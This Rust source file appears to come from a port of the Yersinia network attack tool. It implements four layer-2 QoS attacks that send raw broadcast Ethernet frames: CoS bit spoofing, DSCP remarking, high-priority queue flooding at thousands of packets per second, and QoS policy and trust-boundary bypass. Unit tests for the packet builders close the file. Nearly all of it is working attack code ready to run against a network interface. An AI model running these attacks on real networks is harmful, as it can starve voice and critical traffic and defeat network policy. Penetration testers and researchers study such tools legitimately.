//! QoS/CoS Attack Implementations
use super::packet::{CosPriority, DscpValue, QosPacket};
use async_trait::async_trait;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

#[derive(Debug, Clone)]
pub struct CosBitManipulationAttack {
    pub target_priority: CosPriority,
    pub packet_count: usize,
    pub payload_size: usize,
}

impl CosBitManipulationAttack {
    pub fn new(priority: CosPriority) -> Self {
        Self {
            target_priority: priority,
            packet_count: 1000,
            payload_size: 1500,
        }
    }

    pub fn with_count(mut self, count: usize) -> Self {
        self.packet_count = count;
        self
    }

    pub fn with_size(mut self, size: usize) -> Self {
        self.payload_size = size;
        self
    }

    pub fn build_packets(&self) -> Vec<QosPacket> {
        let mut packets = Vec::new();
        let payload = vec![0xAA; self.payload_size];

        for _ in 0..self.packet_count {
            let pkt = QosPacket::new()
                .with_cos(self.target_priority)
                .with_payload(payload.clone());
            packets.push(pkt);
        }

        packets
    }
}

#[derive(Debug, Clone)]
pub struct DscpManipulationAttack {
    pub target_dscp: DscpValue,
    pub packet_count: usize,
    pub spoof_marking: bool,
}

impl DscpManipulationAttack {
    pub fn new(dscp: DscpValue) -> Self {
        Self {
            target_dscp: dscp,
            packet_count: 1000,
            spoof_marking: false,
        }
    }

    pub fn with_spoofing(mut self) -> Self {
        self.spoof_marking = true;
        self
    }

    pub fn with_count(mut self, count: usize) -> Self {
        self.packet_count = count;
        self
    }

    pub fn build_packets(&self) -> Vec<QosPacket> {
        let mut packets = Vec::new();

        for _ in 0..self.packet_count {
            let pkt = QosPacket::new().with_dscp(self.target_dscp);
            packets.push(pkt);
        }

        packets
    }
}

#[derive(Debug, Clone)]
pub struct PriorityQueueFloodingAttack {
    pub flood_highest_priority: bool,
    pub packets_per_second: usize,
    pub duration_seconds: u64,
}

impl Default for PriorityQueueFloodingAttack {
    fn default() -> Self {
        Self::new()
    }
}

impl PriorityQueueFloodingAttack {
    pub fn new() -> Self {
        Self {
            flood_highest_priority: true,
            packets_per_second: 10000,
            duration_seconds: 60,
        }
    }

    pub fn with_rate(mut self, pps: usize) -> Self {
        self.packets_per_second = pps;
        self
    }

    pub fn with_duration(mut self, seconds: u64) -> Self {
        self.duration_seconds = seconds;
        self
    }

    pub fn build_flood_packets(&self) -> Vec<QosPacket> {
        let mut packets = Vec::new();
        let total_packets = self.packets_per_second * self.duration_seconds as usize;

        for _ in 0..total_packets {
            let pkt = if self.flood_highest_priority {
                QosPacket::high_priority()
            } else {
                QosPacket::voice_priority()
            };
            packets.push(pkt);
        }

        packets
    }
}

#[derive(Debug, Clone)]
pub struct QosPolicyBypassAttack {
    pub bypass_method: QosBypassMethod,
    pub target_priority: u8,
}

#[derive(Debug, Clone, Copy)]
pub enum QosBypassMethod {
    CosSpoofing,
    DscpRemarkingBypass,
    PriorityEscalation,
    TrustBoundaryViolation,
}

impl QosPolicyBypassAttack {
    pub fn new(method: QosBypassMethod) -> Self {
        Self {
            bypass_method: method,
            target_priority: 7,
        }
    }

    pub fn with_priority(mut self, priority: u8) -> Self {
        self.target_priority = priority & 0x07;
        self
    }

    pub fn build_bypass_packets(&self) -> Vec<QosPacket> {
        let mut packets = Vec::new();

        match self.bypass_method {
            QosBypassMethod::CosSpoofing => {
                // Spoof highest CoS priority
                packets.push(
                    QosPacket::new()
                        .with_cos(CosPriority::NetworkControl)
                        .with_dscp(DscpValue::Default),
                );
            }
            QosBypassMethod::DscpRemarkingBypass => {
                // Use DSCP values that bypass remarking policies
                packets.push(QosPacket::new().with_dscp(DscpValue::EF));
                packets.push(QosPacket::new().with_dscp(DscpValue::CS6));
                packets.push(QosPacket::new().with_dscp(DscpValue::CS7));
            }
            QosBypassMethod::PriorityEscalation => {
                // Escalate from low to high priority
                for priority in 0..=7 {
                    let cos = match priority {
                        0 => CosPriority::BestEffort,
                        1 => CosPriority::Background,
                        2 => CosPriority::ExcellentEffort,
                        3 => CosPriority::CriticalApps,
                        4 => CosPriority::Video,
                        5 => CosPriority::Voice,
                        6 => CosPriority::InternetControl,
                        7 => CosPriority::NetworkControl,
                        _ => CosPriority::BestEffort,
                    };
                    packets.push(QosPacket::new().with_cos(cos));
                }
            }
            QosBypassMethod::TrustBoundaryViolation => {
                // Send packets with markings that should be untrusted
                packets.push(
                    QosPacket::new()
                        .with_cos(CosPriority::NetworkControl)
                        .with_dscp(DscpValue::EF),
                );
            }
        }

        packets
    }
}

#[async_trait]
impl Attack for CosBitManipulationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let packets = self.build_packets();
        let interval = Duration::from_micros(1_000_000 / self.packet_count.max(1) as u64);

        for (idx, qos_packet) in packets.iter().enumerate() {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let qos_bytes = qos_packet.to_bytes();

            let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, qos_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending CoS manipulation packet {}: {}", idx, e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "CoS Bit Manipulation"
    }
}

#[async_trait]
impl Attack for DscpManipulationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let packets = self.build_packets();
        let interval = Duration::from_micros(1_000_000 / self.packet_count.max(1) as u64);

        for (idx, qos_packet) in packets.iter().enumerate() {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let qos_bytes = qos_packet.to_bytes();

            let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, qos_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending DSCP manipulation packet {}: {}", idx, e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "DSCP Manipulation"
    }
}

#[async_trait]
impl Attack for PriorityQueueFloodingAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let packets = self.build_flood_packets();
        let interval = Duration::from_micros(1_000_000 / self.packets_per_second.max(1) as u64);

        for (idx, qos_packet) in packets.iter().enumerate() {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let qos_bytes = qos_packet.to_bytes();

            let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, qos_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                if idx % 1000 == 0 {
                    eprintln!("Error sending priority flood packet {}: {}", idx, e);
                }
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "Priority Queue Flooding"
    }
}

#[async_trait]
impl Attack for QosPolicyBypassAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(100);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let packets = self.build_bypass_packets();

            for qos_packet in &packets {
                let qos_bytes = qos_packet.to_bytes();

                let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
                let src_mac = MacAddress(ctx.interface.mac_address.0);

                let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, qos_bytes);
                let frame_bytes = frame.to_bytes();

                if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                    ctx.stats.increment_errors();
                    eprintln!("Error sending QoS policy bypass packet: {}", e);
                } else {
                    ctx.stats.increment_packets_sent();
                    ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
                }
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "QoS Policy Bypass"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_cos_manipulation() {
        let attack = CosBitManipulationAttack::new(CosPriority::Voice).with_count(10);
        let packets = attack.build_packets();
        assert_eq!(packets.len(), 10);
        assert_eq!(packets[0].cos_priority, CosPriority::Voice as u8);
    }

    #[test]
    fn test_dscp_manipulation() {
        let attack = DscpManipulationAttack::new(DscpValue::EF).with_count(5);
        let packets = attack.build_packets();
        assert_eq!(packets.len(), 5);
        assert_eq!(packets[0].dscp_value, DscpValue::EF as u8);
    }

    #[test]
    fn test_priority_flooding() {
        let attack = PriorityQueueFloodingAttack::new()
            .with_rate(100)
            .with_duration(1);
        let packets = attack.build_flood_packets();
        assert_eq!(packets.len(), 100);
    }

    #[test]
    fn test_qos_bypass() {
        let attack = QosPolicyBypassAttack::new(QosBypassMethod::CosSpoofing);
        let packets = attack.build_bypass_packets();
        assert!(!packets.is_empty());
    }

    #[test]
    fn test_priority_escalation() {
        let attack = QosPolicyBypassAttack::new(QosBypassMethod::PriorityEscalation);
        let packets = attack.build_bypass_packets();
        assert_eq!(packets.len(), 8); // All 8 priority levels
    }
}
